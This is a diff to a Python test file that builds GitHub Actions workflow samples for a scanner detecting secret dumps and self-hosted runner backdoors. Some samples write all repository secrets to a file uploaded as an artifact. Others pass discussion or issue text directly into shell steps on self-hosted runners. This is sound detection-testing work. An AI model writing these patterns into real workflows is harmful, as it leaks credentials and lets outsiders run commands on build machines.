@@ -156,6 +156,44 @@ def _workflow(kind: str) -> bytes:
             b"      - uses: example/secrets-to-env@v1\n"
             b"        with:\n          secrets: ${{ toJSON(secrets) }}\n"
         )
+    if kind == "dump-input-upload":
+        # The action input is the only dump; the later upload ships build output, not secrets.
+        return (
+            b"on: push\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n"
+            b"      - uses: example/secrets-to-env@v1\n"
+            b"        with:\n          prefix: APP_\n          secrets: ${{ toJSON(secrets) }}\n"
+            b"      - run: npm ci && npm run build\n"
+            b"      - uses: actions/upload-artifact@v4\n"
+            b"        with:\n          name: dist\n          path: dist/\n"
+        )
+    if kind == "dump-artifact":
+        # The later Shai-Hulud shape: the dump lands in a file that is published as an artifact.
+        return (
+            b"on: push\njobs:\n  lint:\n    runs-on: ubuntu-latest\n"
+            b"    env:\n      DATA: ${{ toJSON(secrets) }}\n    steps:\n"
+            b'      - run: echo "$DATA" > format-results.txt\n'
+            b"      - uses: actions/upload-artifact@v4\n"
+            b"        with:\n          path: format-results.txt\n"
+        )
+    if kind == "other-job-comment":
+        # A comment line opens the second job; the self-hosted runner is still the first job's.
+        return (
+            b"on: issues\njobs:\n  build:\n    runs-on: self-hosted\n    steps:\n"
+            b"      - run: make\n  triage:\n    # hosted runner\n\n    runs-on: ubuntu-latest\n"
+            b'    steps:\n      - run: echo "${{ github.event.issue.title }}"\n'
+        )
+    if kind == "backdoor-environment":
+        # A job-level environment: map is part of the job, not a new job header.
+        return (
+            b"on: discussion\njobs:\n  process:\n    runs-on: self-hosted\n"
+            b"    environment:\n      name: ops\n    steps:\n"
+            b"      - run: echo ${{ github.event.discussion.body }}\n"
+        )
+    if kind == "backdoor-block-comment":
+        return (
+            b"on: discussion\njobs:\n  process:\n    runs-on: self-hosted\n    steps:\n"
+            b"      - run: | # handle\n          echo ${{ github.event.discussion.body }}\n"
+        )
     if kind == "env-after-block":
         # The event text reaches the shell only through an environment variable.
         return (
@@ -170,7 +208,12 @@ def _workflow(kind: str) -> bytes:
             b"      - run: make test\n  echo:\n    runs-on: ubuntu-latest\n    steps:\n"
             b"      - run: echo ${{ github.event.discussion.body }}\n"
         )
-    runner = b"self-hosted" if kind == "backdoor" else b"ubuntu-latest"
+    # Runner labels are case-insensitive, and runs-on may be a block list.
+    runner = {
+        "backdoor": b"self-hosted",
+        "backdoor-label-case": b"Self-Hosted",
+        "backdoor-label-list": b"\n      - self-hosted",
+    }.get(kind, b"ubuntu-latest")
     return (
         b"on:\n  discussion:\njobs:\n  process:\n    runs-on: " + runner + b"\n"
         b"    steps:\n      - run: echo ${{ github.event.discussion.body }}\n"
@@ -430,6 +473,29 @@ def cases() -> list[tuple[str, bytes, str | None]]:
         ("builtin-eval.keras", _keras("builtin-eval"), "heuristic_keras_unsafe_call"),
         ("env-after-block.yml", _workflow("env-after-block"), None),
         ("other-job.yml", _workflow("other-job"), None),
+        ("secrets-to-env-upload.yml", _workflow("dump-input-upload"), None),
+        ("formatter.yml", _workflow("dump-artifact"), "dev_github_workflow_secrets_dump"),
+        ("other-job-comment.yml", _workflow("other-job-comment"), None),
+        (
+            "environment.yaml",
+            _workflow("backdoor-environment"),
+            "dev_github_workflow_runner_backdoor",
+        ),
+        (
+            "block-comment.yaml",
+            _workflow("backdoor-block-comment"),
+            "dev_github_workflow_runner_backdoor",
+        ),
+        (
+            "label-case.yaml",
+            _workflow("backdoor-label-case"),
+            "dev_github_workflow_runner_backdoor",
+        ),
+        (
+            "label-list.yaml",
+            _workflow("backdoor-label-list"),
+            "dev_github_workflow_runner_backdoor",
+        ),
     ]
 
 
